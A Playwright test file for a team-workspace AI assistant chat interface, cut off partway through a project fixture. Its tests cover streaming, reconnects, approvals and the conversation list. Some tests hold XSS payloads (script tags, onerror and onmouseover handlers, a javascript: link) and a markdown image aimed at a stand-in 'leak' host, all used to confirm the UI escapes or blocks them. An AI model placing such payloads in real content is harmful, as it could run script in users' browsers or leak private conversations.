import { test, expect, type Page, type WebSocketRoute } from '@playwright/test';

const workspace = { id: 'workspace-1', slug: 'test', name: 'Test Workspace', current_user_role: 'owner' };
const conversation = {
	id: 'chat-1',
	title: 'A persistent conversation',
	workspace_id: workspace.id,
	creator_id: 'user-1',
	created_at: '2026-10-26T10:00:00Z',
	updated_at: '2026-10-26T10:00:00Z'
};
const userMessage = {
	id: 'message-1',
	conversation_id: 'chat-1',
	sequence: 1,
	role: 'user',
	content: 'Hello assistant',
	status: 'completed',
	provider: '',
	model: '',
	created_at: conversation.created_at
};
const reply = {
	...userMessage,
	id: 'message-2',
	sequence: 2,
	role: 'assistant',
	content: '',
	status: 'streaming',
	provider: 'openai_compatible',
	model: 'configured-model'
};

async function fixture(page: Page) {
	const state = {
		messages: [] as (typeof userMessage)[],
		tools: [] as any[],
		approvals: [] as any[],
		queue: [] as any[],
		decisions: [] as string[],
		decisionStatus: 200,
		cursor: 0,
		events: [] as Array<{ cursor: number; [key: string]: unknown }>,
		sends: [] as string[],
		sockets: [] as WebSocketRoute[],
		denied: false,
		failAfterSend: false,
		failNextHistory: false,
		sendDelay: null as Promise<void> | null,
		replayDelay: null as Promise<void> | null,
		replayRequested: false,
		olderDelay: null as Promise<void> | null,
		olderRequested: false
	};
	await page.routeWebSocket('**/api/workspaces/test/ws', () => {});
	await page.routeWebSocket('**/conversations/chat-1/stream*', (socket) => {
		state.sockets.push(socket);
	});
	await page.route('https://raw.githubusercontent.com/**', (route) => route.fulfill({ json: [] }));
	await page.route('**/api/**', async (route) => {
		const url = new URL(route.request().url());
		const path = url.pathname;
		if (!path.startsWith('/api/')) return route.continue();
		if (path === '/api/auth/me')
			return route.fulfill({
				json: { id: 'user-1', name: 'Owner', display_name: 'Owner', email: 'owner@example.test' }
			});
		if (path === '/api/workspaces') return route.fulfill({ json: [workspace] });
		if (path === '/api/workspaces/test') return route.fulfill({ json: workspace });
		if (path === '/api/notifications') return route.fulfill({ json: { notifications: [], unread_count: 0 } });
		if (path.endsWith('/assistant/status'))
			return route.fulfill({ json: { configured: true, provider: 'openai_compatible', model: 'configured-model' } });
		if (path === '/api/workspaces/test/agent-tasks') return route.fulfill({ json: state.queue });
		if (path === '/api/workspaces/test/agent-tasks/task-9')
			return route.fulfill({
				json: {
					id: 'task-9',
					conversation_id: 'chat-issue',
					state: 'running',
					reason: 'Native coding harness started',
					provider: 'codex',
					model: 'deepseek-flash',
					generation: 1
				}
			});
		if (path.endsWith('/conversations'))
			return route.fulfill({ json: route.request().method() === 'POST' ? conversation : [conversation] });
		if (path.includes('/conversations/chat-1')) {
			if (state.denied) return route.fulfill({ status: 404, json: { error: { code: 'NOT_FOUND' } } });
			if (path.endsWith('/messages')) {
				state.sends.push(route.request().postDataJSON().content);
				if (state.sendDelay) await state.sendDelay;
				if (state.failAfterSend) state.failNextHistory = true;
				state.messages = [userMessage, reply];
				return route.fulfill({ status: 202, json: reply });
			}
			if (path.includes('/approvals/')) {
				const decision = route.request().postDataJSON().decision;
				state.decisions.push(decision);
				if (state.decisionStatus !== 200)
					return route.fulfill({ status: state.decisionStatus, json: { error: { code: 'INTERNAL_ERROR' } } });
				const resolved = {
					...state.approvals[0],
					status: decision === 'approve' ? 'approved' : 'denied',
					task_id: decision === 'approve' ? 'task-9' : undefined,
					resolved_at: '2026-10-26T10:05:00Z',
					updated_at: '2026-10-26T10:05:00Z'
				};
				state.approvals = [resolved];
				return route.fulfill({ json: resolved });
			}
			if (path.endsWith('/events')) {
				state.replayRequested = true;
				if (state.replayDelay) await state.replayDelay;
				return route.fulfill({
					json: state.events.filter((event) => event.cursor > Number(url.searchParams.get('after') ?? 0))
				});
			}
			if (path.endsWith('/cancel')) {
				state.messages = state.messages.map((m) => (m.status === 'streaming' ? { ...m, status: 'cancelled' } : m));
				return route.fulfill({ status: 204 });
			}
			if (state.failNextHistory) {
				state.failNextHistory = false;
				return route.fulfill({ status: 500, json: { error: { code: 'INTERNAL_ERROR' } } });
			}
			const before = Number(url.searchParams.get('before') ?? 0);
			if (before && state.olderDelay) {
				state.olderRequested = true;
				await state.olderDelay;
			}
			const messages = state.messages.filter((m) => !before || m.sequence < before);
			return route.fulfill({
				json: {
					conversation,
					messages: messages.slice(-50),
					tools: state.tools,
					approvals: state.approvals,
					cursor: state.cursor,
					has_more: messages.length > 50
				}
			});
		}
		return route.fulfill({ json: [] });
	});
	return state;
}

test('streams real events, preserves history and deduplicates reconnect replay', async ({ page }) => {
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect.poll(() => state.sends).toEqual(['Hello assistant']);
	await expect.poll(() => state.sockets.length).toBeGreaterThanOrEqual(2);
	const event = {
		id: 'event-3',
		cursor: 3,
		conversation_id: 'chat-1',
		type: 'message.delta',
		payload: { message_id: 'message-2', delta: 'Live partial answer' }
	};
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.getByText('Live partial answer', { exact: true })).toBeVisible();
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.getByText('Live partial answer', { exact: true })).toHaveCount(1);
	const socketCount = state.sockets.length;
	state.events = [
		{ ...event, id: 'event-4', cursor: 4, payload: { message_id: 'message-2', delta: ' after reconnect' } }
	];
	state.sockets.at(-1)!.close({ code: 1012, reason: 'Restart' });
	await expect.poll(() => state.sockets.length).toBe(socketCount + 1);
	await expect(page.getByText('Live partial answer after reconnect', { exact: true })).toBeVisible();
	expect(state.sockets.at(-1)!.url()).toContain('after=4');
	state.messages = [userMessage, { ...reply, content: 'Live partial answer after reconnect', status: 'completed' }];
	state.cursor = 5;
	state.sockets.at(-1)!.send(
		JSON.stringify({
			...event,
			id: 'event-5',
			cursor: 5,
			type: 'message.completed',
			payload: { message_id: 'message-2', status: 'completed' }
		})
	);
	await page.reload();
	await expect(page.getByText('Live partial answer after reconnect', { exact: true })).toBeVisible();
	expect(state.sends).toHaveLength(1);
});

test('keyboard newline, local drafts and mobile layout', async ({ page }, testInfo) => {
	await page.setViewportSize({ width: 375, height: 812 });
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('First line');
	await composer.press('Shift+Enter');
	await composer.type('Second line');
	expect(state.sends).toHaveLength(0);
	await page.reload();
	await expect(composer).toHaveValue('First line\nSecond line');
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('mobile.png') });
});

test('clears conversation content after access is revoked', async ({ page }) => {
	const state = await fixture(page);
	state.messages = [userMessage, { ...reply, content: 'Private response', status: 'completed' }];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Private response', { exact: true })).toBeVisible();
	state.denied = true;
	state.sockets[0].close({ code: 1008, reason: 'Access revoked' });
	await expect(page.getByText('Private response', { exact: true })).toHaveCount(0);
	await expect(page.getByText('This conversation is no longer available.')).toBeVisible();
});

test('loads long history without moving the reader and follows only at the live edge', async ({ page }, testInfo) => {
	const state = await fixture(page);
	state.messages = Array.from({ length: 130 }, (_, i) => ({
		...userMessage,
		id: `history-${i}`,
		sequence: i + 1,
		role: i % 2 ? 'assistant' : 'user',
		content: `History message ${i}. ` + 'Detailed content. '.repeat(30)
	}));
	await page.goto('/test/assistant?conversation=chat-1');
	const viewport = page.locator('[data-slot="message-scroller-viewport"]');
	await expect(page.locator('[data-slot="message"]')).toHaveCount(50);
	await viewport.hover();
	await page.mouse.wheel(0, -100000);
	await expect.poll(() => viewport.evaluate((el) => el.scrollTop)).toBe(0);
	await page.getByRole('button', { name: 'Load older messages' }).click();
	await expect(page.locator('[data-slot="message"]')).toHaveCount(100);
	await expect.poll(() => viewport.evaluate((el) => el.scrollTop)).toBeGreaterThan(0);
	const position = await viewport.evaluate((el) => el.scrollTop);
	const event = {
		id: 'new',
		cursor: 200,
		conversation_id: 'chat-1',
		type: 'message.created',
		payload: { ...reply, id: 'latest', sequence: 131, content: 'New live activity' }
	};
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.locator('[data-slot="message"]')).toHaveCount(101);
	expect(Math.abs((await viewport.evaluate((el) => el.scrollTop)) - position)).toBeLessThan(40);
	await page.getByRole('button', { name: 'Scroll to latest' }).click();
	await expect(page.getByText('New live activity', { exact: true })).toBeInViewport();
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('desktop.png') });
	await page.evaluate(() => document.documentElement.classList.add('dark'));
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('desktop-dark.png') });
});

test('does not fetch provider-authored image URLs or execute agent HTML', async ({ page }) => {
	const state = await fixture(page);
	const fetched: string[] = [];
	await page.route('https://untrusted.example/**', (route) => {
		fetched.push(route.request().url());
		return route.fulfill({ status: 204 });
	});
	state.messages = [
		userMessage,
		{
			...reply,
			status: 'completed',
			content:
				'Safe response\n\n![preview](https://untrusted.example/leak?conversation=private)\n\n<script>window.agentExecuted=true</script>\n\n[Review changes](https://github.com/example/project/pull/1)'
		}
	];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Safe response', { exact: true })).toBeVisible();
	await expect(page.locator('.assistant-markdown img')).toHaveCount(0);
	expect(fetched).toEqual([]);
	expect(await page.evaluate(() => Boolean((window as unknown as { agentExecuted?: boolean }).agentExecuted))).toBe(
		false
	);
	await expect(page.getByRole('link', { name: 'Review changes' })).toHaveAttribute(
		'href',
		'https://github.com/example/project/pull/1'
	);
});

test('keeps accepted sends visible while a history reload fails', async ({ page }) => {
	const state = await fixture(page);
	state.failAfterSend = true;
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect(page.getByRole('alert').filter({ hasText: 'Something went wrong' })).toBeVisible();
	await expect(page.getByText('Responding…', { exact: true })).toBeVisible();
	await composer.fill('Another thought');
	await expect(page.getByRole('button', { name: 'Send message' })).toHaveCount(0);
	await expect(page.getByText('Hello assistant', { exact: true })).toBeVisible({ timeout: 8000 });
	expect(state.sends).toHaveLength(1);
});

test('preserves a new draft typed while a send is pending', async ({ page }) => {
	const state = await fixture(page);
	let release!: () => void;
	state.sendDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect.poll(() => state.sends.length).toBe(1);
	await composer.fill('My next thought');
	release();
	await expect(page.getByText('Hello assistant', { exact: true })).toBeVisible();
	await expect(composer).toHaveValue('My next thought');
});

test('ignores a delayed reconnect after a fresh conversation load', async ({ page }) => {
	const state = await fixture(page);
	state.messages = [userMessage, reply];
	let release!: () => void;
	state.replayDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	await expect.poll(() => state.sockets.length).toBe(1);
	state.sockets[0].close({ code: 1012, reason: 'Restart' });
	await expect.poll(() => state.replayRequested).toBe(true);
	await page.getByRole('button', { name: 'Stop response' }).click();
	await expect.poll(() => state.sockets.length).toBe(2);
	release();
	// Observe the stale network continuation; it must not open a third socket.
	await page.waitForTimeout(300);
	expect(state.sockets).toHaveLength(2);
});

test('does not restore delayed older history after access is revoked', async ({ page }) => {
	const state = await fixture(page);
	state.messages = Array.from({ length: 60 }, (_, i) => ({
		...userMessage,
		id: `history-${i}`,
		sequence: i + 1,
		content: `Private message ${i}`
	}));
	let release!: () => void;
	state.olderDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.locator('[data-slot="message"]')).toHaveCount(50);
	await page.getByRole('button', { name: 'Load older messages' }).click();
	await expect.poll(() => state.olderRequested).toBe(true);
	state.denied = true;
	state.sockets.at(-1)!.close({ code: 1008, reason: 'Revoked' });
	await expect(page.getByText('This conversation is no longer available.')).toBeVisible();
	release();
	await page.waitForTimeout(300);
	await expect(page.locator('[data-slot="message"]')).toHaveCount(0);
});

test('opens persistent issue chat in place and links its focused view back to the issue', async ({ page }) => {
	const state = await fixture(page);
	const issue = {
		id: 'issue-1',
		identifier: 'ENG-1',
		workspace_id: workspace.id,
		team_id: 'team-1',
		title: 'Implement issue chat',
		description: 'Issue context',
		status: 'todo',
		priority: 0,
		number: 1,
		creator_id: 'user-1',
		created_at: conversation.created_at,
		updated_at: conversation.updated_at,
		labels: [],
		assignees: []
	};
	let opens = 0;
	await page.route('**/api/workspaces/test/issues/ENG-1', (route) => route.fulfill({ json: issue }));
	await page.route('**/api/workspaces/test/conversations', (route) => {
		if (route.request().method() === 'POST') {
			expect(route.request().postDataJSON()).toEqual({ issue_id: issue.id });
			opens++;
			return route.fulfill({ json: { ...conversation, issue_id: issue.id, team_id: issue.team_id } });
		}
		return route.fulfill({ json: [{ ...conversation, issue_id: issue.id, team_id: issue.team_id }] });
	});
	await page.goto('/test/issue/ENG-1');
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	const chat = page.getByRole('region', { name: 'Issue chat', exact: true });
	await expect(chat.getByRole('textbox', { name: 'Message', exact: true })).toBeVisible();
	await chat.getByRole('textbox', { name: 'Message', exact: true }).fill('Explain the implementation');
	await chat.getByRole('textbox', { name: 'Message', exact: true }).press('Enter');
	await expect.poll(() => state.sends).toEqual(['Explain the implementation']);
	await expect(page).toHaveURL(/\/issue\/ENG-1$/);
	await expect(chat.getByRole('link', { name: 'Open full conversation' })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-1'
	);
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	await expect(chat.getByText('Hello assistant', { exact: true })).toBeVisible();
	expect(opens).toBe(1);
	await page.route('**/api/workspaces/test/conversations/chat-1?*', (route) =>
		route.fulfill({
			json: {
				conversation: { ...conversation, issue_id: issue.id, team_id: issue.team_id },
				issue: {
					id: issue.id,
					identifier: issue.identifier,
					title: issue.title,
					description: issue.description,
					status: issue.status
				},
				messages: state.messages,
				cursor: state.cursor,
				has_more: false
			}
		})
	);
	await chat.getByRole('link', { name: 'Open full conversation' }).click();
	await expect(page.getByRole('link', { name: 'ENG-1', exact: true })).toHaveAttribute('href', '/test/issue/ENG-1');
});

test('denied issue chat stays empty and can retry a temporary opening failure', async ({ page }) => {
	await fixture(page);
	const issue = {
		id: 'issue-1',
		identifier: 'ENG-1',
		workspace_id: workspace.id,
		team_id: 'team-1',
		title: 'Scoped issue',
		status: 'todo',
		priority: 0,
		creator_id: 'user-1',
		created_at: conversation.created_at,
		updated_at: conversation.updated_at,
		labels: [],
		assignees: []
	};
	await page.route('**/api/workspaces/test/issues/ENG-1', (route) => route.fulfill({ json: issue }));
	let status = 500;
	await page.route('**/api/workspaces/test/conversations', (route) =>
		route.fulfill({ status, json: { error: { code: 'DENIED' } } })
	);
	await page.setViewportSize({ width: 390, height: 844 });
	await page.goto('/test/issue/ENG-1');
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	const chat = page.getByRole('region', { name: 'Issue chat', exact: true });
	await expect(chat.getByRole('button', { name: 'Retry', exact: true })).toBeVisible();
	status = 404;
	await chat.getByRole('button', { name: 'Retry', exact: true }).click();
	await expect(chat.getByText('This conversation is no longer available.')).toBeVisible();
	await expect(chat.getByRole('textbox')).toHaveCount(0);
});

test('renders recorded tool calls from history and live events as escaped data', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'I created the issue.' };
	state.messages = [userMessage, answered];
	state.cursor = 4;
	const created = {
		id: 'tool-1',
		conversation_id: 'chat-1',
		message_id: answered.id,
		sequence: 0,
		call_id: 'call_1',
		name: 'create_issue',
		input: { team_key: 'ENG', title: 'Dark mode' },
		status: 'completed',
		output: { identifier: 'ENG-7', title: '<img src=x onerror="window.evil=1">' },
		created_at: conversation.created_at
	};
	state.tools = [created];
	await page.goto('/test/assistant?conversation=chat-1');
	const trigger = page.getByRole('button', { name: 'Created ENG-7' });
	await expect(trigger).toBeVisible();
	await expect(page.getByRole('link', { name: 'ENG-7' })).toHaveAttribute('href', '/test/issue/ENG-7');
	await trigger.click();
	await expect(
		page.locator('[data-slot="code-block-code"]').getByText('<img src=x onerror=', { exact: false })
	).toBeVisible();
	expect(await page.evaluate(() => (window as any).evil)).toBeUndefined();
	await expect.poll(() => state.sockets.length).toBeGreaterThan(0);
	const search = {
		...created,
		id: 'tool-2',
		sequence: 1,
		call_id: 'call_2',
		name: 'search_issues',
		input: { query: 'dark' },
		status: 'running',
		output: undefined
	};
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e5', cursor: 5, conversation_id: 'chat-1', type: 'tool.started', payload: search }));
	await expect(page.getByText('Running Search issues', { exact: true })).toBeVisible();
	const failed = { ...search, status: 'failed', error: 'query must be 1 to 200 characters' };
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e6', cursor: 6, conversation_id: 'chat-1', type: 'tool.completed', payload: failed }));
	await expect(page.getByRole('button', { name: 'Failed to run Search issues' })).toBeVisible();
	// A late replay of the start must not hide the recorded failure.
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e5', cursor: 5, conversation_id: 'chat-1', type: 'tool.started', payload: search }));
	await expect(page.getByRole('button', { name: 'Failed to run Search issues' })).toBeVisible();
	await expect(page.getByText('I created the issue.', { exact: true })).toBeVisible();
	const updated = {
		...created,
		id: 'tool-3',
		sequence: 2,
		call_id: 'call_3',
		name: 'update_issue',
		input: { identifier: 'ENG-7', priority: 1 },
		output: { identifier: 'ENG-7', title: 'Dark mode' }
	};
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e7', cursor: 7, conversation_id: 'chat-1', type: 'tool.completed', payload: updated }));
	await expect(page.getByRole('button', { name: 'Updated ENG-7' })).toBeVisible();
});

test('asks for approval before delegating and records the decision from the backend', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'Approval is pending.' };
	state.messages = [userMessage, answered];
	const call = {
		id: 'tool-9',
		conversation_id: 'chat-1',
		message_id: answered.id,
		sequence: 0,
		call_id: 'call_9',
		name: 'delegate_issue',
		input: { identifier: 'ENG-1' },
		status: 'completed',
		output: { approval_id: 'approval-1', status: 'pending_user_approval', identifier: 'ENG-1' },
		created_at: conversation.created_at
	};
	state.tools = [call];
	state.approvals = [
		{
			id: 'approval-1',
			conversation_id: 'chat-1',
			tool_call_id: 'tool-9',
			action: 'delegate_issue',
			actor_id: 'user-1',
			issue_id: 'issue-1',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				instructions: '<b onmouseover="window.evil=1">Implement</b> dark mode'
			},
			status: 'pending',
			expires_at: '2026-10-27T10:00:00Z',
			created_at: conversation.created_at,
			updated_at: conversation.created_at
		}
	];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Start a coding agent on ENG-1?', { exact: true })).toBeVisible();
	await expect(page.getByText('<b onmouseover=', { exact: false })).toBeVisible();
	await page.setViewportSize({ width: 360, height: 800 });
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toBeInViewport();
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
	expect(await page.evaluate(() => (window as any).evil)).toBeUndefined();
	state.decisionStatus = 500;
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByRole('alert').getByText('The decision could not be saved. Try again.')).toBeVisible();
	state.decisionStatus = 200;
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toHaveCount(0);
	const subagent = page.getByRole('button', { name: /Coding agent on ENG-1/ });
	await expect(subagent).toBeVisible();
	await expect(subagent).toContainText('Running');
	await subagent.click();
	await expect(page.getByText('Native coding harness started', { exact: true })).toBeVisible();
	await expect(page.getByRole('link', { name: 'Open the issue chat' })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-issue'
	);
	expect(state.decisions).toEqual(['approve', 'approve']);
	await page.reload();
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	// A stale pending copy replayed later cannot reopen the decision.
	await expect.poll(() => state.sockets.length).toBeGreaterThan(0);
	state.sockets.at(-1)!.send(
		JSON.stringify({
			id: 'e9',
			cursor: 9,
			conversation_id: 'chat-1',
			type: 'approval.requested',
			payload: { ...state.approvals[0], status: 'pending', updated_at: conversation.created_at }
		})
	);
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toHaveCount(0);
});

test('a long conversation list scrolls inside the sidebar, never the page', async ({ page }) => {
	const state = await fixture(page);
	const many = Array.from({ length: 40 }, (_, i) => ({ ...conversation, id: `chat-${i + 2}`, title: `Conversation ${i + 2}` }));
	await page.route('**/api/workspaces/test/conversations', (route) =>
		route.fulfill({ json: route.request().method() === 'POST' ? conversation : [conversation, ...many] })
	);
	state.queue = [
		{
			id: 'b',
			conversation_id: 'chat-b',
			state: 'awaiting_review',
			reason: '',
			issue_identifier: 'ENG-2',
			issue_title: 'Title ENG-2',
			updated_at: conversation.created_at
		}
	];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByRole('region', { name: 'Agent work', exact: true })).toBeAttached();
	// Visually hidden labels below the fold must not stretch the document.
	expect(await page.evaluate(() => document.documentElement.scrollHeight <= window.innerHeight)).toBe(true);
	await page.mouse.move(640, 300);
	await page.mouse.wheel(0, 3000);
	expect(await page.evaluate(() => window.scrollY)).toBe(0);
});

test('lists agent work across projects as a queue linking to each issue chat', async ({ page }) => {
	const state = await fixture(page);
	const item = (id: string, identifier: string, taskState: string) => ({
		id,
		conversation_id: `chat-${id}`,
		state: taskState,
		reason: '',
		issue_identifier: identifier,
		issue_title: `Title ${identifier}`,
		updated_at: conversation.created_at
	});
	state.queue = [item('a', 'ENG-1', 'running'), item('b', 'ENG-2', 'awaiting_review'), item('c', 'WEB-3', 'completed')];
	await page.goto('/test/assistant');
	const queue = page.getByRole('region', { name: 'Agent work', exact: true });
	await expect(queue.getByText('2 in progress or waiting', { exact: true })).toBeVisible();
	await expect(queue.getByRole('link', { name: /ENG-1 · Title ENG-1/ })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-a'
	);
	await expect(queue.getByRole('link', { name: /ENG-2/ })).toBeVisible();
	await expect(queue.getByRole('link', { name: /WEB-3/ })).toBeHidden();
	await queue.getByRole('button', { name: '1 finished' }).click();
	await expect(queue.getByRole('link', { name: /WEB-3/ })).toBeVisible();
});

test('lists the issues a reply used and offers contextual suggestions', async ({ page }) => {
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const suggestion = page.getByRole('button', { name: 'Which of my issues are in review?' });
	await expect(suggestion).toBeVisible();
	await suggestion.click();
	await expect.poll(() => state.sends).toEqual(['Which of my issues are in review?']);

	const answered = { ...reply, status: 'completed', content: 'Two issues are in review.' };
	state.messages = [userMessage, answered];
	state.tools = [
		{
			id: 't1',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 0,
			call_id: 'c1',
			name: 'search_issues',
			input: { query: 'review' },
			status: 'completed',
			output: {
				issues: [
					{ identifier: 'ENG-1', title: 'Dark mode' },
					{ identifier: 'ENG-2', title: 'Search' },
					{ identifier: 'javascript:alert(1)', title: 'x' }
				]
			},
			created_at: conversation.created_at
		},
		{
			id: 't2',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 1,
			call_id: 'c2',
			name: 'get_issue',
			input: { identifier: 'ENG-1' },
			status: 'completed',
			output: { identifier: 'ENG-1', title: 'Dark mode' },
			created_at: conversation.created_at
		},
		{
			id: 't3',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 2,
			call_id: 'c3',
			name: 'plan_issues',
			input: { identifiers: ['ENG-1', 'ENG-2'] },
			status: 'completed',
			output: { waves: [[{ identifier: 'ENG-1', title: 'Dark mode' }], [{ identifier: 'ENG-2', title: 'Search' }]] },
			created_at: conversation.created_at
		}
	];
	await page.reload();
	await expect(page.getByText('Ran Plan issues')).toBeVisible();
	const sources = page.getByRole('button', { name: 'Used 2 issues' });
	await expect(sources).toBeVisible();
	await sources.click();
	await expect(page.getByRole('link', { name: /ENG-2 · Search/ })).toHaveAttribute('href', '/test/issue/ENG-2');
	await expect(page.getByRole('link', { name: /javascript/ })).toHaveCount(0);
});

test('groups conversations into folders and deletes one after confirmation', async ({ page }) => {
	await fixture(page);
	const other = { ...conversation, id: 'chat-2', title: 'Release notes' };
	const folders: { id: string; name: string }[] = [];
	const moves: unknown[] = [];
	const deletes: string[] = [];
	await page.route('**/api/workspaces/test/conversations', (route) =>
		route.fulfill({ json: route.request().method() === 'POST' ? conversation : [conversation, other] })
	);
	await page.route('**/api/workspaces/test/conversation-folders', (route) => {
		if (route.request().method() === 'POST') {
			const folder = { id: 'folder-1', name: route.request().postDataJSON().name };
			folders.push(folder);
			return route.fulfill({ status: 201, json: folder });
		}
		return route.fulfill({ json: folders });
	});
	await page.route('**/api/workspaces/test/conversations/chat-2', (route) => {
		if (route.request().method() === 'PATCH') {
			moves.push(route.request().postDataJSON());
			return route.fulfill({ json: { ...other, folder_id: route.request().postDataJSON().folder_id } });
		}
		if (route.request().method() === 'DELETE') {
			deletes.push('chat-2');
			return route.fulfill({ status: 204 });
		}
		return route.fallback();
	});
	await page.goto('/test/assistant?conversation=chat-1');
	const nav = page.getByRole('navigation', { name: 'Conversations' });
	await expect(nav.getByRole('link', { name: 'Release notes' })).toBeVisible();
	await expect(page.getByRole('separator', { name: 'Resize conversation list' })).toBeVisible();
	const live = page.getByRole('button', { name: 'Live' });
	await live.click();
	await expect(
		page.getByText('Connected. New messages, tool calls and agent updates appear here as they happen.')
	).toBeVisible();
	await page.keyboard.press('Escape');

	await page.getByRole('button', { name: 'New folder' }).click();
	// The folder is named in place, in the list.
	const name = nav.getByRole('textbox', { name: 'Folder name' });
	await expect(name).toBeFocused();
	await name.fill('Releases');
	await name.press('Enter');
	await expect(nav.getByRole('button', { name: /^Releases \d+$/ })).toBeVisible();

	await nav.getByRole('button', { name: 'Actions for Release notes' }).click();
	await page.getByRole('menuitem', { name: 'Move to', exact: true }).click();
	await page.getByRole('menuitem', { name: 'Releases' }).click();
	await expect.poll(() => moves).toEqual([{ folder_id: 'folder-1' }]);
	const folder = nav.getByRole('button', { name: /^Releases \d+$/ });
	await expect(folder).toContainText('1');
	// Folders start collapsed unless they hold the open conversation.
	await expect(nav.getByRole('link', { name: 'Release notes' })).toBeHidden();
	await folder.click();
	await expect(nav.getByRole('link', { name: 'Release notes' })).toBeVisible();

	await nav.getByRole('button', { name: 'Actions for Release notes' }).click();
	await page.getByRole('menuitem', { name: 'Delete' }).click();
	const dialog = page.getByRole('alertdialog');
	await expect(dialog).toContainText('Release notes');
	await dialog.getByRole('button', { name: 'Delete' }).click();
	await expect.poll(() => deletes).toEqual(['chat-2']);
	await expect(nav.getByRole('link', { name: 'Release notes' })).toHaveCount(0);
});

test('renames a conversation in place from its menu', async ({ page }) => {
	await fixture(page);
	const renames: unknown[] = [];
	await page.route('**/api/workspaces/test/conversations/chat-1', (route) => {
		if (route.request().method() !== 'PATCH') return route.fallback();
		const body = route.request().postDataJSON();
		renames.push(body);
		return route.fulfill({ json: { ...conversation, title: body.title.trim() } });
	});
	await page.goto('/test/assistant?conversation=chat-1');
	const nav = page.getByRole('navigation', { name: 'Conversations' });
	const header = page.getByRole('region', { name: 'Conversation' });
	await expect(nav.getByRole('link', { name: 'A persistent conversation' })).toBeVisible();
	await expect(header.getByText('A persistent conversation')).toBeVisible();

	// Escape keeps the old title and sends nothing.
	await nav.getByRole('button', { name: 'Actions for A persistent conversation' }).click();
	await page.getByRole('menuitem', { name: 'Rename' }).click();
	const field = nav.getByRole('textbox', { name: 'Conversation name' });
	await expect(field).toBeFocused();
	await expect(field).toHaveValue('A persistent conversation');
	await field.fill('Discarded');
	await field.press('Escape');
	await expect(nav.getByRole('link', { name: 'A persistent conversation' })).toBeVisible();
	expect(renames).toEqual([]);

	await nav.getByRole('button', { name: 'Actions for A persistent conversation' }).click();
	await page.getByRole('menuitem', { name: 'Rename' }).click();
	await field.fill('  Launch plan ');
	await field.press('Enter');
	await expect.poll(() => renames).toEqual([{ title: 'Launch plan' }]);
	await expect(nav.getByRole('link', { name: 'Launch plan' })).toBeVisible();
	// The open conversation's header follows the new title.
	await expect(header.getByText('Launch plan')).toBeVisible();
});

async function projectFixture(page: Page) {
	const projects = [
		{ id: 'p-1', name: 'Launch', team_id: null },
		{ id: 'p-2', name: 'Company', team_id: null }
	];
	const tagged = { ...conversation, project_id: 'p-1', project: projects[0] };
	const loose = { ...conversation, id: 'chat-2', title: 'Release notes', project_id: null, project: null };
	const issueChat = {
		...conversation,
		id: 'chat-3',
		title: 'ENG-1 · Fix login',
		issue_id: 'issue-1',
		team_id: 'team-1',
		project_id: null,
		project: null
	};
	const chats = [tagged, loose, issueChat];
	const requests = { lists: [] as (string | null)[], creates: [] as unknown[], patches: [] as unknown[] };
	await page.route('**/api/workspaces/test/projects', (route) => route.fulfill({ json: projects }));
	await page.route(
		(url) => url.pathname === '/api/workspaces/test/conversations',
		(route) => {
			if (route.request().method() === 'POST') {
				requests.creates.push(route.request().postDataJSON());
				return route.fulfill({ status: 201, json: tagged });
			}
			const filter = new URL(route.request().url()).searchParams.get('project_id');
			requests.lists.push(filter);
